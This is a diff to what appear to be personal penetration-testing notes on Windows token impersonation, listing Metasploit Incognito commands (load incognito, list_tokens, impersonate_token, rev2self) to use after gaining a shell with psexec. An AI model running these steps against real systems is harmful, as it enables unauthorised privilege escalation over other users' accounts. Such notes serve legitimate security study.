@@ -25,9 +25,13 @@ after getting a shell with psexec we can load *Incognito*
 ```
 load incognito
 help
-list_tokens -u or -g (to list the tokens on the machine)
+list_tokens -u or -g # (to list the tokens on the machine)
 
 impersonate_token THETOKEN
 
 rev2self (to get back to the user u started with)
 ```
+
+
+---
+Tags: #delegation #Token_impersonation
